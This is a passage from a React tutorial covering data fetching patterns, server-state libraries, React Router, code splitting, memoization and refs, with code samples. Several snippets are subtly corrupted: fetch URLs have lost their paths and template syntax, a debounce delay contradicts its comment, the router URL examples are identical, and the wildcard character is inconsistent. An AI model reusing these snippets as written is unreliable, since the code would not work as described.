  async function fetchUser() {
    try {
      const res = await fetch(`https://example.com`, { signal });
      const data = await res.json();
      setUser(data);
    } catch (err) {
      if (err.name === "AbortError") {
        console.log("Fetch successfully aborted");
      } else {
        setError(err.message);
      }
    }
  }

  fetchUser();

  // Cancel the request if the user navigates away or parameters change mid-fetch
  return () => controller.abort();
}, []);
```

---

### 187. Data Flow Patterns## Polling:

Polling involves repeatedly hitting an API endpoint at fixed time intervals to keep client data synchronized with a fast-changing server (e.g., chat apps, stock prices, live sports tickers).

In React, polling is established using setInterval combined with useEffect. It is essential to clear the interval during the cleanup function to prevent memory leaks and stacked background intervals.

```jsx
useEffect(() => {
  async function checkStatus() {
    const res = await fetch("https://example.com");
    const data = await res.json();
    setStatus(data);
  }

  checkStatus(); // Run immediately on mount
  const intervalId = setInterval(checkStatus, 5000); // Poll every 5 seconds

  return () => clearInterval(intervalId); // Essential cleanup
}, []);
```

---

### 188. Pagination:

Pagination breaks massive database records down into manageable chunks called "pages" (e.g., 10 items per page). The React application maintains a page state counter, maps it to an API query string, and updates the view when the page index changes.

```jsx
function PaginatedList() {
  const [page, setPage] = useState(1);
  const [items, setItems] = useState([]);

  useEffect(() => {
    fetch(`https://example.com{page}&limit=10`)
      .then((res) => res.json())
      .then((data) => setItems(data));
  }, [page]); // Re-runs fetch whenever the page state changes

  return (
    <div>
      <ul>
        {items.map((item) => (
          <li key={item.id}>{item.name}</li>
        ))}
      </ul>
      <button disabled={page === 1} onClick={() => setPage((p) => p - 1)}>
        Prev
      </button>
      <span>Page {page}</span>
      <button onClick={() => setPage((p) => p + 1)}>Next</button>
    </div>
  );
}
```

---

### 189. Infinite Scrolling:

Infinite scrolling appends fresh content as the user scrolls toward the bottom of the page, eliminating explicit pagination buttons (common in social media feeds).

While you can listen to window scroll events, the modern, performant standard is using the Intersection Observer API. This API watches a hidden "anchor" DOM element placed at the bottom of your item list. When that element becomes visible in the viewport, it triggers a fetch for the next page.

```jsx
import { useEffect, useState, useRef } from "react";

function InfiniteFeed() {
  const [items, setItems] = useState([]);
  const [page, setPage] = useState(1);
  const loaderRef = useRef(null);

  useEffect(() => {
    // Append items instead of overwriting them
    fetch(`https://example.com{page}`)
      .then((res) => res.json())
      .then((newItems) => setItems((prev) => [...prev, ...newItems]));
  }, [page]);

  useEffect(() => {
    const observer = new IntersectionObserver(
      (entries) => {
        // If the loader div enters the screen, increment the page state
        if (entries[0].isIntersecting) {
          setPage((prevPage) => prevPage + 1);
        }
      },
      { threshold: 1.0 },
    );

    if (loaderRef.current) observer.observe(loaderRef.current);

    return () => observer.disconnect();
  }, []);

  return (
    <div>
      {items.map((item) => (
        <div key={item.id}>{item.content}</div>
      ))}
      <div
        ref={loaderRef}
        style={{ height: "20px", background: "transparent" }}
      >
        Loading more items...
      </div>
    </div>
  );
}
```

---

### 190. Performance Optimization - Debouncing vs. Throttling:

Both techniques limit how many times a high-frequency action can fire, but they solve different architectural problems.

| Concept    | Behavior                                                                                                                               | Best Used For                                              |
| ---------- | -------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------- |
| Debouncing | Bundles a series of rapid events into a single execution, running it only after a specified delay period of complete silence.          | Search autocomplete inputs, auto-save forms.               |
| Throttling | Enforces a maximum frequency limit, ensuring an event handler runs at most once per specified time window, ignoring mid-interval spam. | Window resizing, infinite scroll triggers, mouse dragging. |

#### Debounce Implementation Example (Search input)

```js
function SearchInput() {
  const [searchTerm, setSearchTerm] = useState("");

  useEffect(() => {
    // Wait 500ms after the user stops typing before making the API request
    const delayDebounceFn = setTimeout(() => {
      if (searchTerm) {
        fetch(`https://example.com{searchTerm}`);
      }
    }, 5000);

    // If the user types another letter before 500ms, clear the old timer and reset
    return () => clearTimeout(delayDebounceFn);
  }, [searchTerm]);

  return <input type="text" onChange={(e) => setSearchTerm(e.target.value)} />;
}
```

---

### 191. Caching Strategies:

Caching prevents redundant network requests by storing previous server responses locally in memory, creating a snappier user experience and reducing server load.

In raw React, basic caching can be implemented by storing responses in a persistent JavaScript object outside the component or inside a React useRef reference container.

```js
// Simple in-memory global cache store
const apiCache = {};

function CachedProfile({ userId }) {
  const [profile, setProfile] = useState(null);

  useEffect(() => {
    // If the data is already in cache, use it immediately and skip the network fetch
    if (apiCache[userId]) {
      setProfile(apiCache[userId]);
      return;
    }

    fetch(`https://example.com{userId}`)
      .then((res) => res.json())
      .then((data) => {
        apiCache[userId] = data; // Save response data to cache
        setProfile(data);
      });
  }, [userId]);

  return <div>{profile?.name}</div>;
}
```

#### Modern Production Standards:

While writing manual cache mechanisms within useEffect is a good learning exercise, production apps typically use specialized libraries like TanStack Query (React Query) or SWR. These tools replace boilerplate useEffect fetching code entirely and offer built-in support for caching, background revalidation, automatic retries, and window focus refetching out of the box.

---

## 17. <u> Server State Management </u> -

### 192. Architectural Foundations - Server State vs. UI State:

Managing data in a frontend application requires separating state into two completely distinct categories based on who owns the data and where it lives.

| Dimension   | UI State (Client State)                                          | Server State                                                         |
| ----------- | ---------------------------------------------------------------- | -------------------------------------------------------------------- |
| Ownership   | Owned completely by the client application.                      | Owned remotely by the server or database.                            |
| Access      | Synchronous and instantly available in memory.                   | Asynchronous; requires network requests to read/write.               |
| Concurrency | Only one user modifies it (e.g., toggling a dark mode switch).   | Multi-user; can be modified by other users out of nowhere.           |
| Accuracy    | Always 100% accurate up to the current user action.              | Can become "stale" (outdated) immediately after fetching.            |
| Examples    | Open modals, input field values, sidebar toggles, tabs selected. | User profiles, product catalogs, shopping cart items, notifications. |

Traditional tools like useState or Redux were designed for UI State. When used for Server State, they force you to write endless boilerplate for loading states, error handling, caching, and synchronization.

---

#### React Query / TanStack Query vs. SWR:

Instead of treating server data like local variables, these libraries act as smart caching layers built specifically to handle server state.

#### TanStack Query (Formerly React Query):

TanStack Query is an incredibly robust, feature-rich library for managing async state. It is fully framework-agnostic (supporting React, Vue, Svelte, and Solid).

- Feature Set: Extensive. Built-in support for infinite scrolling, advanced pagination, window focus refetching, explicit offline support, garbage collection, and request cancellation.
- Mutations: Provides dedicated, explicit primitives (useMutation) to manage data-changing operations independently from data-fetching queries.
- DevTools: Includes highly detailed, interactive debugging panels to inspect cache status (fresh, stale, fetching, inactive) in real time.

#### SWR (Stale-While-Revalidate):

SWR is a lightweight, minimalist alternative created and maintained by Vercel (the creators of Next.js).

- The Philosophy: Focuses on the HTTP RFC 5861 caching strategy: display cached/stale data immediately, fetch fresh data in the background, and then update the UI seamlessly.
- API Footprint: Significantly smaller and simpler than TanStack Query. It uses a single primary hook (useSWR) for both fetching and lightweight mutations.
- Bundle Size: Ideal for smaller projects or performance-critical applications where minimizing JavaScript bundle size is a top priority.

---

### 193. Core Mechanics - Query Keys:

Query keys act as the unique identifiers for your data cache. They function exactly like database primary keys or object property lookup names.

In TanStack Query, query keys must be formatted as arrays. When the values inside a query key change, the library automatically treats it as a brand-new query and fetches fresh data.

```js
// Simple array key for global data
useQuery({ queryKey: ["todos"], queryFn: fetchTodos });

// Serialized array key for dependent, dynamic data
// If 'userId' changes from 1 to 2, a separate cache bucket is created automatically
useQuery({ queryKey: ["user", userId], queryFn: () => fetchUserById(userId) });

// Complex nested filter states
useQuery({
  queryKey: ["products", { status: "active", page: 3 }],
  queryFn: fetchProducts,
});
```

---

### 194. Mutations & Cache Invalidation:

While queries handle reading data, mutations handle writing, updating, or deleting data on the server.

When a mutation updates data on the server, your local client cache becomes instantly outdated. Cache Invalidation tells the library to mark specific query keys as "stale," triggering an automatic background refetch to synchronize your UI with the database.

```jsx
import { useQuery, useMutation, useQueryClient } from "@tanstack/react-query";

function TodoList() {
  const queryClient = useQueryClient();

  // 1. Read Server State
  const { data: todos } = useQuery({
    queryKey: ["todos"],
    queryFn: fetchTodos,
  });

  // 2. Modify Server State
  const mutation = useMutation({
    mutationFn: createNewTodoOnServer,
    onSuccess: () => {
      // 3. Cache Invalidation: Tells React Query to instantly re-fetch the 'todos' array
      queryClient.invalidateQueries({ queryKey: ["todos"] });
    },
  });

  return (
    <button onClick={() => mutation.mutate({ text: "Learn TanStack" })}>
      Add Todo
    </button>
  );
}
```

---

### 195. Background Refetching:

To ensure server state does not rot on the user's screen, libraries perform automatic background refetches without showing disruptive global loading spinners. The UI stays fully interactive using old data while the fresh data streams in silently.

By default, background refetching triggers automatically on three high-value user behaviors:

1.  Refetch on Mount: Whenever a component using a query mounts to the DOM.
2.  Refetch on Window Focus: Whenever a user switches browser tabs, leaves the app, or clicks back into the window. This ensures they immediately see fresh data without refreshing manually.
3.  Refetch on Reconnect: If the user momentarily loses network connection and recovers it, the cache re-synchronizes immediately.

---

### 196. Advanced UX Patterns - Optimistic Updates:

An optimistic update is an advanced UI pattern where you skip the loading spinner entirely. You assume the network request will succeed, and update the UI instantly before the server even acknowledges the request.

If the server succeeds, the UI seamlessly transitions. If the server fails, you roll back the UI to its exact previous state, providing an instantaneous, zero-latency user experience.

```jsx
const mutation = useMutation({
  mutationFn: updateTodoTextOnServer,

  // Executed immediately before the network request goes out:
  onMutate: async (newTodo) => {
    // 1. Cancel any outgoing refetches so they don't overwrite our optimistic update
    await queryClient.cancelQueries({ queryKey: ["todos"] });

    // 2. Snapshot the current cache value (for rollback purposes)
    const previousTodos = queryClient.getQueryData(["todos"]);

    // 3. Optimistically force the new data into the cache ahead of time
    queryClient.setQueryData(["todos"], (old) =>
      old.map((todo) =>
        todo.id === newTodo.id ? { ...todo, ...newTodo } : todo,
      ),
    );

    // 4. Return the snapshot context object to pass it down to onError
    return { previousTodos };
  },

  // Executed if the server throws an error:
  onError: (err, newTodo, context) => {
    // Roll back the cache to the exact state it was in before onMutate ran
    queryClient.setQueryData(["todos"], context.previousTodos);
    alert("Failed to save changes. Rolling back configuration.");
  },

  // Executed always (whether it succeeds or fails):
  onSettled: () => {
    // Force a fresh validation refetch to ensure we are perfectly synced with the DB
    queryClient.invalidateQueries({ queryKey: ["todos"] });
  },
});
```

---

## 18. <u> Routing </u> -

### 197. Routing Core Mechanics - Single Page Applications (SPA) & Client-Side Routing:

In a traditional multi-page website, clicking a link forces the browser to request a brand-new HTML document from the server, causing a noticeable page refresh.

React applications are Single Page Applications (SPAs). They load only one minimal HTML file on startup. Client-side routing intercepts browser navigation, dynamically updates the URL bar via the HTML5 History API, and swaps out parts of the React component tree on the screen instantly—all without a single full-page reload.

---

### 198. Router Variants - BrowserRouter vs. HashRouter:

To enable routing, you must wrap your root application inside a Router provider component.

```js
// BrowserRouter URL: https://example.com
import { BrowserRouter } from "react-router-dom";

// HashRouter URL: https://example.com
import { HashRouter } from "react-router-dom";
```

#### BrowserRouter:

- Uses the modern standard browser HTML5 History API (pushState, replaceState).
- Generates clean, standard URL paths (e.g., /about, /users/profile).
- Server Requirement: Requires production web servers (Nginx, Apache, Netlify, Vercel) to be explicitly configured to route all incoming requests back to the main `index.html` file. Otherwise, refreshing a page at /dashboard will result in a standard server 404 Not Found error.

#### HashRouter:

- Uses the URL hash fragment (the portion after the # symbol) to simulate routing.
- The browser never sends the hash fragment to the web server.
- Useful for legacy architectures, static shared files open directly from a hard drive, or cheap hosting environments where you have zero access to configure server fallback rules.

---

### 199. Declarative Structural Components: Routes & Route:

Routes and Route are the structural foundation blocks used to declare matching paths to target UI components.

```jsx
import { Routes, Route } from "react-router-dom";

function App() {
  return (
    <Routes>
      <Route path="/" element={<Home />} />
      <Route path="/about" element={<About />} />
      <Route path="*" element={<NotFound />} />
    </Routes>
  );
}
```

- `<Routes>`: Functions like a switch statement. It examines the current browser URL location, searches through its immediate children, and renders only the single best matching `<Route>`.
- `<Route>`: Takes a path string and an element containing the React component to mount when that path matches the browser address bar.
- 404 Pages (path="_"): The asterisk _ acts as a wildcard catch-all symbol. If the router checks all listed routes sequentially and finds no matching path, it falls back to render the 404 error component assigned to this wildcard route.

---

### 200. Client-Side Navigation - Link vs. NavLink:

Using standard HTML `<a href="...">` anchor tags in React causes a full browser page refresh, completely wiping out your local application memory/state. React Router replaces them with declarative components.

```jsx
import { Link, NavLink } from "react-router-dom";

function Navbar() {
  return (
    <nav>
      {/* Basic Link */}
      <Link to="/profile">Profile</Link>

      {/* NavLink for Navigation Bars */}
      <NavLink
        to="/dashboard"
        className={({ isActive }) => (isActive ? "active-tab" : "inactive-tab")}
      >
        Dashboard
      </NavLink>
    </nav>
  );
}
```

- `<Link>`: Compiles down to an anchor tag in the DOM but overrides the default click behavior, safely changing the URL path and updating the component tree smoothly in place.
- `<NavLink>`: A specialized wrapper designed specifically for active navigation states. It knows exactly when its target path matches the current browser location. It accepts a function in its className or style props, allowing you to dynamically apply CSS classes based on the isActive state.

---

### 201. Dynamic Routing & Context Hooks - Dynamic Routing & useParams:

Dynamic Routing allows a route to match varying patterns rather than static strings (e.g., routing thousands of unique profile pages using a single generic structural template). You specify dynamic segments in the path parameter by prefixing them with a colon (:).

```jsx
// In Route Configuration:
<Route path="/user/:userId" element={<UserProfile />} />;

// In UserProfile Component:
import { useParams } from "react-router-dom";

function UserProfile() {
  // Extract URL parameters cleanly as an object
  const { userId } = useParams();
  return <h1>Viewing Profile for User ID: {userId}</h1>;
}
```

---

### 202. State & URL Management Hooks - useLocation:

Returns the current browser location object, reflecting where the user currently stands in the app. This is highly useful for analytics page tracking, or reading raw location hashes.

```js
const location = useLocation();
console.log(location.pathname); // Output: "/dashboard/settings"
```

#### useSearchParams:

Reads and updates values embedded inside standard URL query strings (the arguments following the ? marker). It acts exactly like a React useState hook, but synchronizes state explicitly inside the browser URL string.

```jsx
import { useSearchParams } from "react-router-dom";

function ProductCatalog() {
  const [searchParams, setSearchParams] = useSearchParams();
  const category = searchParams.get("category"); // reads "?category=shoes"

  return (
    <button onClick={() => setSearchParams({ category: "electronics" })}>
      Filter Electronics
    </button>
  );
}
```

#### useNavigate:

Enables imperative programmatic navigation inside your custom JavaScript functions, like auto-redirecting a user after a successful login form submission.

```jsx
import { useNavigate } from "react-router-dom";

function LoginForm() {
  const navigate = useNavigate();

  const handleLogin = () => {
    // Authenticate user logic here...
    navigate("/dashboard", { replace: true }); // 'replace: true' overwrites history stack history
  };

  return <button onClick={handleLogin}>Log In</button>;
}
```

---

### 203. Structural & Architectural Layouts - Nested Routes & Layout Routes:

Nested Routing mirrors complex UI structural hierarchies directly inside your URL layout (e.g., displaying a persistent Sidebar and Topbar navbar across an entire collection of different internal dashboard pages).

To implement this, you nest `<Route>` tags inside a parent `<Route>`. The parent layout component uses the `<Outlet>` component to define precisely where child nested elements should paint on the screen.

```jsx
import { Routes, Route, Outlet } from "react-router-dom";

// 1. Shared Layout Component
function DashboardLayout() {
  return (
    <div className="dashboard-container">
      <aside className="sidebar">Navigation Menu</aside>
      <main className="content-area">
        {/* Child components render inside this Outlet placeholder */}
        <Outlet />
      </main>
    </div>
  );
}

// 2. Application Config Tree
function App() {
  return (
    <Routes>
      {/* Layout Route */}
      <Route path="/dashboard" element={<DashboardLayout />}>
        {/* Nested Routes inside Layout */}
        <Route path="analytics" element={<AnalyticsPage />} />{" "}
        {/* URL: /dashboard/analytics */}
        <Route path="settings" element={<SettingsPage />} />{" "}
        {/* URL: /dashboard/settings */}
      </Route>
    </Routes>
  );
}
```

---

### 204. Protected Routes & Route Guards:

Protected Routes (or route guards) restrict application URLs to authenticated users, automatically kicking unauthenticated traffic back to a generic public landing screen or login form.

You build this pattern by creating a custom higher-order structural layout wrapper that intercepts navigation conditionally based on global authorization flags.

```jsx
import { Navigate, Outlet } from "react-router-dom";

function ProtectedRoute({ isAuthenticated }) {
  if (!isAuthenticated) {
    // Hard redirect to login screen, saving their intended destination in history
    return <Navigate to="/login" replace />;
  }

  // Render sub-routes if authenticated
  return <Outlet />;
}

// Usage in Route configuration:
<Routes>
  <Route path="/public" element={<PublicHome />} />

  {/* Wrap protected pages together under the Guard component */}
  <Route element={<ProtectedRoute isAuthenticated={userLoggedIn} />}>
    <Route path="/admin" element={<AdminDashboard />} />
    <Route path="/billing" element={<BillingPortal />} />
  </Route>
</Routes>;
```

---

### 205. Performance Optimization - Lazy Loaded Routes:

By default, standard JavaScript imports bundle your entire web application code into a single, massive file that the browser must download completely on startup.

Lazy Loading splits your application into small chunks. The browser only downloads the specific page file it needs when the user explicitly navigates to that path. This is achieved using `React.lazy()` along with the `<Suspense>` boundary element.

```jsx
import React, { Suspense } from "react";
import { Routes, Route } from "react-router-dom";

// Code split imports via React.lazy
const LazyAdmin = React.lazy(() => import("./pages/AdminDashboard"));
const LazyProfile = React.lazy(() => import("./pages/UserProfile"));

function App() {
  return (
    <Routes>
      <Route
        path="/admin"
        element={
          <Suspense fallback={<div>Loading Page Resources...</div>}>
            <LazyAdmin />
          </Suspense>
        }
      />
      <Route
        path="/profile"
        element={
          <Suspense fallback={<div>Loading User Profile...</div>}>
            <LazyProfile />
          </Suspense>
        }
      />
    </Routes>
  );
}
```

---

## 19. <u> Code Splitting & Lazy Loading </u> -

### 206. Core Mechanics of Bundling & Dynamic Imports - Bundle Optimization:

When building a production-ready React application, compilers like _Webpack_, _Vite_, or _Rollup crawl_ through your static source code file system using traditional import strings. They package all your custom code and third-party node packages into a **single, massive JavaScript file called a bundle**.

While a single file reduces the number of initial HTTP requests, it creates a massive performance bottleneck as your application grows.

- The Problem: A user landing on your login screen is forced to download, parse, and execute the entire codebase—including heavy charts, admin dash metrics, and profile dashboards they may not even have access to see yet.
- The Solution: _Bundle optimization_ uses **Code Splitting** to chop that single monolith file into smaller, independent micro-chunks. These files are then fetched asynchronously on-demand only when requested by user interaction, dramatically decreasing your application's initial **Time to Interactive** (TTI) and **_First Contentful Paint (FCP)_** metrics.

---

### 207. Static Imports vs. Dynamic Imports:

To understand how code splitting works under the hood, you must look at how files are pulled into your project.

```js
// 1. Static Import (Standard)
import { format } from "date-fns";
```

- Behavior: Synchronous. Evaluated at build-time. The compiler permanently merges date-fns directly into the current file bundle bucket. It cannot be loaded conditionally inside an if block.

```js
// 2. Dynamic Import
import("date-fns").then((module) => {
  const format = module.format;
  // Use function here...
});
```

- Behavior: **Asynchronous**. **Evaluated dynamically at runtime**. When the execution thread hits this line, the browser fires an asynchronous network request to fetch that chunk file from the server.
- Mechanism: Dynamic imports return a JavaScript Promise that resolves to the module wrapper object. This allows you to tuck code-heavy libraries safely inside user interaction closures (like button clicks) so they don't load on application boot.

---

### 208. React Lazy Loading API - React.lazy & Suspense:

React builds directly on top of native JavaScript dynamic imports using two core primitives: `React.lazy()` and the `<Suspense>` boundary wrapper.

#### React.lazy():

`React.lazy()` is a specialized utility function that lets you render a dynamically imported component exactly like a standard, statically imported React component.

- Constraint: The target component file must export itself as a default export.

#### Suspense & Loading Fallbacks:

Because lazy-loaded files must stream down across a network connection asynchronously, there will naturally be a visual delay between the user requesting the element and the file arriving. If React attempts to parse a component that hasn't loaded yet, the application would crash.

The `<Suspense>` component functions like a specialized error boundary tailored specifically for loading states. It intercepts the pending promise thrown by `React.lazy()` and holds up rendering. It displays a temporary placeholder UI defined in its Loading Fallback prop until the network operation completes successfully.

```jsx
import React, { useState, Suspense } from "react";

// Lazy-loaded component definition
const LazyAnalyticsChart = React.lazy(
  () => import("./components/AnalyticsChart"),
);

function AdminDashboard() {
  const [showChart, setShowChart] = useState(false);

  return (
    <div>
      <h1>Operational Metrics</h1>
      <button onClick={() => setShowChart(true)}>
        Generate Complex Reports
      </button>

      {showChart && (
        // The application safely displays the spinner fallback while AnalyticsChart loads
        <Suspense
          fallback={<div className="spinner">Assembling Chart Assets...</div>}
        >
          <LazyAnalyticsChart />
        </Suspense>
      )}
    </div>
  );
}
```

---

### 209. Architectural Implementations - Route-Based Code Splitting:

`Route-Based Code Splitting` is the most common form of splitting. It divides your application into clean chunks grouped by unique pages or URL destinations.

Since users can only look at one webpage view at a single moment, there is no technical reason to fetch the assets of other application pages until they explicitly trigger a navigation event.

```jsx
import React, { Suspense } from "react";
import { BrowserRouter as Router, Routes, Route } from "react-router-dom";

// Define explicit bundle chunk splits based on application views
const HomePage = React.lazy(() => import("./routes/Home"));
const SettingsPage = React.lazy(() => import("./routes/Settings"));
const BillingPortal = React.lazy(() => import("./routes/Billing"));

function App() {
  return (
    <Router>
      {/* 
        Placing Suspense high up here wraps the entire router stack.
        Whenever a user shifts pages, the fallback component handles the transition gap smoothly.
      */}
      <Suspense
        fallback={<div className="global-loader">Loading layout assets...</div>}
      >
        <Routes>
          <Route path="/" element={<HomePage />} />
          <Route path="/settings" element={<SettingsPage />} />
          <Route path="/billing" element={<BillingPortal />} />
        </Routes>
      </Suspense>
    </Router>
  );
}
```

---

### 210. Component-Based Code Splitting:

While route splitting optimizes page transitions, Component-Based Code Splitting optimizes complex individual pages by fine-tuning single internal elements.

This strategy is used to isolate highly demanding, resource-heavy features tucked away inside a shared view, ensuring they don't delay the loading of basic text content surrounding them.

#### Best Scenarios for Component-Based Splitting

- Modals & Overlays: A huge multi-tab "Account Configuration Modal" that only pops up if a user clicks an edit button.
- Heavy Data Visualizations: Complex maps, interactive canvas graphs, or webGL dashboard widgets.
- Rich Text `WYSIWYG` Editors: Large markdown editing blocks loaded only when a user toggles an entry from "Read" to "Edit" mode.
- Third-Party Heavy Utilities: Excel/CSV exporter engines or image processing tools.

```jsx
import React, { useState, Suspense } from "react";

// Isolate a heavy Markdown Editor tool from the main post text content chunk
const HeavyEditor = React.lazy(() => import("./utils/MarkdownEditor"));

function PostViewer({ postContent }) {
  const [isEditing, setIsEditing] = useState(false);

  return (
    <div className="post-container">
      <article>
        <h1>{postContent.title}</h1>
        <p>{postContent.body}</p>
      </article>

      <button onClick={() => setIsEditing(true)}>Edit Article Text</button>

      {isEditing && (
        <Suspense fallback={<p>Initializing rich text editing tools...</p>}>
          {/* HeavyEditor bundle is only pulled down here when editing is enabled */}
          <HeavyEditor initialValue={postContent.body} />
        </Suspense>
      )}
    </div>
  );
}
```

---

#### Summary of Code Splitting Types:

| Strategy        | Trigger Mechanism                 | Target Content                                  | Main Goal                                                                         |
| --------------- | --------------------------------- | ----------------------------------------------- | --------------------------------------------------------------------------------- |
| Route-Based     | URL path modification             | High-level page components (/profile, /billing) | Accelerates the initial website application startup speed.                        |
| Component-Based | User clicks, state flips, toggles | Isolated nodes (Modals, Charts, rich editors)   | Reduces the size of page-specific chunks by loading secondary features on demand. |

---

## 20. <u> Performance Optimization </u> -

### 211. The Rendering Engine & Core Mechanics -The Reconciliation Process & The Virtual DOM:

To understand performance optimization, you must understand how React updates the screen. React maintains a lightweight **in-memory representation** of your user interface called the **Virtual DOM**.

When a component's state or props change, React runs a process called **Reconciliation**:

1.  **Render Phase**: React executes the component function to generate a new Virtual DOM tree. This phase is purely transactional and does not touch the actual browser screen.
2.  **Diffing Algorithm**: React compares the brand-new Virtual DOM tree against the previous Virtual DOM snapshot. It uses highly optimized, **O(n) heuristic rules** to identify exactly what changed.
3.  **Commit Phase**: React applies the calculated differences directly to the native browser DOM using minimal node alterations.

#### The Two Guarantees of the Diffing Algorithm:

To keep computations fast, React relies on two major assumptions:

1.  Different Types Produce Different Trees: If a parent element changes type (e.g., swapping a `<div>` for a `<section>`), React completely tears down the old component subtree, destroying its local state, and builds a brand-new tree from scratch.
2.  Keys Identify Persistent Elements: In collections of dynamic children, React uses unique identifiers to track elements across different render cycles.

---

### 212. Key Optimization:

When rendering lists dynamically in React, you must attach a unique, consistent key prop to each item wrapper.

```js
// Anti-pattern: Using array index as a key
items.map((item, index) => <ListItem key={index} data={item} />);

// Production Standard: Using unique, unchanging database IDs
items.map((item) => <ListItem key={item.id} data={item} />);
```

#### The Dangers of Using Index Keys:

If an array is strictly static (never filtered, sorted, appended, or reordered), using the array index as a key is technically acceptable. However, if your list is dynamic, using the index can cause serious rendering bugs and performance hits:

- The Problem: If you delete the very first item in an array, the item previously at index 1 now becomes index 0.
- The Consequence: React sees that key="0" still exists in the DOM. Instead of deleting the correct element, it mistakenly updates the old node's properties with the new data. This can leave internal input elements or local state detached, forcing React to perform unnecessary DOM updates.

---

### 213. Avoiding Unnecessary Renders:

A component re-renders under two default conditions:

1.  It's internal local state changes or a context value updates.
2.  It's parent component re-renders.

The second condition means that even if a child component's props do not change, it will still re-run its entire calculation block if its parent changes state. While React's Virtual DOM diffing is fast, executing complex calculations inside thousands of nested child components during every frame will quickly drag down performance.

---

### 214. Memoization Concepts & Tools - Memoization Explained:

Memoization is a specialized optimization technique that speeds up programs by caching the results of heavy function calls. When the function is called with the exact same inputs again, it bypasses execution and returns the cached result instantly.

React provides three distinct primitives to implement memoization at different levels of your architecture: React.memo, useMemo, and useCallback.

#### React.memo:

React.memo is a higher-order component (HOC) used to skip re-rendering a child component if its incoming props are unchanged.

```jsx
import React from "react";

const ExpensiveChild = React.memo(function ExpensiveChild({ username }) {
  console.log("Child rendered!");
  return <p>Welcome back, {username}!</p>;
});
```

#### Shallow Comparison Check:

By default, `React.memo` performs a strictly shallow comparison on incoming props:

- Primitive values (Strings, Numbers, Booleans) are checked by value (5 === 5 → true). If they don't change, the render is skipped.
- Structural object references (Objects, Arrays, Functions) are checked by memory address allocation.

Because of this reference check, if a parent component regenerates a plain inline object or function on every render, the child component will treat it as a brand-new prop and re-render anyway, completely breaking the optimization.

#### useMemo Optimization:

The useMemo hook caches the returned result of a complex, expensive calculation between renders. It will only re-execute that calculation if the specific variables inside its dependency array change.

```jsx
import { useMemo } from "react";

function AnalyticsDashboard({ rawMetrics }) {
  // Caches the calculated output array so it isn't recalculated on every state change
  const processedData = useMemo(() => {
    return rawMetrics
      .map((m) => m * 2)
      .filter((m) => m > 50)
      .sort();
  }, [rawMetrics]); // Only recalculate if rawMetrics array reference changes

  return <DataPlot source={processedData} />;
}
```

#### useCallback Optimization:

The useCallback hook caches the instance of a function definition itself across render cycles. It ensures that a function passed down as a prop maintains a consistent memory reference, preventing downstream memoized components from breaking.

```jsx
import { useState, useCallback } from "react";

function ParentComponent() {
  const [text, setText] = useState("");

  // Keeps the same function reference across renders
  const handleAction = useCallback(() => {
    console.log("Action triggered");
  }, []); // Empty array means the function reference never changes

  return (
    <div>
      <input value={text} onChange={(e) => setText(e.target.value)} />
      {/* ExpensiveChild will NOT re-render when typing because handleAction is memoized */}
      <ExpensiveChild onClick={handleAction} />
    </div>
  );
}
```

#### The Relationship Between useMemo and useCallback:

Under the hood, `useCallback(fn, deps)` is simply syntactic sugar for useMemo(() => fn, deps). While useMemo caches the evaluated value returned by a function, useCallback caches the function pointer itself.

---

### 215. DOM & UI-Level Architectures - Virtualization & Windowing:

When rendering massive data grids or feeds containing thousands of items (e.g., log viewers or large catalogs), rendering every single DOM element will quickly crash the browser's memory layout engine.

**Virtualization** (or **Windowing**) optimizes this by rendering only the **precise subset** of items currently visible within the user's viewport, plus a small buffer of items just above and below it.

```js
[ Hidden Top Buffer - Unrendered in DOM ]
-----------------------------------------  <- Viewport Top

|   Visible List Item #15 (In DOM)       |
|   Visible List Item #16 (In DOM)       |
|   Visible List Item #17 (In DOM)       |
-----------------------------------------  <- Viewport Bottom
[ Hidden Bottom Buffer - Unrendered in DOM ]
```

As the user scrolls, the library dynamically recycled and swaps out DOM nodes, simulating a massive scrolling container while keeping the actual DOM node count low and stable.

#### Common Industry Tools

- react-window: A highly performant, lightweight library rewritten by Brian Vaughn. It is designed for simple, standardized layouts (fixed or variable item heights/widths) and keeps your final bundle size small.
- react-virtualized: The comprehensive predecessor to react-window. It includes extensive features for complex responsive layouts, window resizing grids, scrolling sync, and masonry layouts, but comes with a larger bundle size footprint.

---

### 216. Diagnostic Profiling & Metrics - Performance Profiling Tools - Chrome DevTools Performance Panel:

- Purpose: Analyzes low-level, systemic browser engine behavior across your entire application.
- Usage: Used to measure Core Web Vitals (like Interactivity and Layout Shifts), capture frame drops (jank), track garbage collection memory leaks, and profile CPU execution behavior.

#### React Profiler Tab:

- Purpose: A specialized tool inside the React DevTools browser extension that records application render passes.
- Flame Charts: Displays a clear, sequential visual timeline of your component tree. Components colored in gray skipped rendering entirely via memoization, while components colored in yellow or amber required processing.
- Ranked Charts: Organizes components by how long they took to render, making it easy to spot calculation bottlenecks.

#### Rendering Bottlenecks:

A rendering bottleneck occurs when components take too long to complete their layout calculations, causing the browser to drop frames and create a laggy user experience.

#### Common Bottleneck Triggers

1.  Unnecessary Parent Propagation: Massive component subtrees re-running calculation logic because a high-level state changed elsewhere.
2.  Heavy Computations in Render Paths: Running complex data transformations, data filtering, or cryptographic operations directly inside the component body instead of wrapping them in useMemo.
3.  State Syncing Overuse: Chaining multiple state triggers consecutively across different hooks, forcing the engine to complete several reconciliation phases in a single frame event.

---

## 21. <u> Refs & DOM Manipulation </u> -

### 217. Foundations of Refs - useRef Basics & The Escape Hatch:

In React, the data flow is strictly declarative: you modify state, and React automatically updates the UI to match. However, sometimes you need to access the underlying browser mechanics directly—such as focusing an input, measuring an element's size, or triggering an imperative browser API.

The useRef hook serves as an escape hatch from this declarative cycle. It returns a persistent object with a single mutable property: `.current`.

```js
const myRef = useRef(initialValue); // Returns { current: initialValue }
```

#### The Golden Rule of Refs:

Changing a ref's `.current` value does not trigger a component re-render.

Because of this, you must never read or write `ref.current` during the rendering phase of a component. Doing so introduces side effects into what should be a pure function. Instead, interact with refs inside useEffect blocks or asynchronous event handlers.

---

### 218. Accessing DOM Elements vs. Mutable Refs - 1. Accessing DOM Elements:

To grab a direct reference to a live DOM element, pass your ref object to the built-in HTML element’s ref attribute. React will automatically assign the corresponding DOM node to `ref.current` once the element mounts, and reset it to null when it unmounts.

```jsx
import { useRef, useEffect } from "react";

function AutoFocusInput() {
  const inputRef = useRef(null);

  useEffect(() => {
    // Accessing native DOM node API safely inside useEffect
    inputRef.current.focus();
  }, []);

  return <input ref={inputRef} type="text" placeholder="Type here..." />;
}
```

